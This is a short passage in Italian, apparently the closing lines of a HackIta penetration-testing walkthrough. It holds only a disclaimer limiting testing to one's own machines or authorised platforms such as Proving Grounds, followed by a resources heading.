+*Walkthrough scritto a scopo educativo per Hackita. Testa solo su macchine di tua proprietà o su piattaforme autorizzate come Proving Grounds.*
 
 ### 🔗 Risorse HackIta
 
